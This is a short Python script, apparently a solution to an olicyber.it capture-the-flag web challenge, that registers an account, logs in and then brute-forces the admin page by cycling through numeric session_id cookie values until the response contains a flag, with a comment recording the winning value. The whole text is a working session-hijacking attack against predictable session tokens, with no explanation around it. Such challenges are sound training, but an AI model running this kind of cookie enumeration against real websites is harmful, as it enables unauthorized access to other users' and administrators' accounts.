import requests
site = "http://too-small-reminder.challs.olicyber.it"
s = requests.Session()
header = {'Content-Type': 'application/json'}
r = s.post(f"{site}/register", headers=header, data='{"username":"xxxxx11", "password":"s123"}')
r1 = s.post(f"{site}/login", headers=header, data='{"username":"xxxxx11", "password":"s123"}')

print(r.text)

print(r1.cookies.get_dict()) 

for i in range(30, int(10e8)): # is 337!
    r = requests.get(f"{site}/admin", cookies={"session_id":f"{i}"})
    if "flag" in r.text.lower():
        print(r.text)
        break
    else:
        print(r.text.replace("\n", "") + str(i))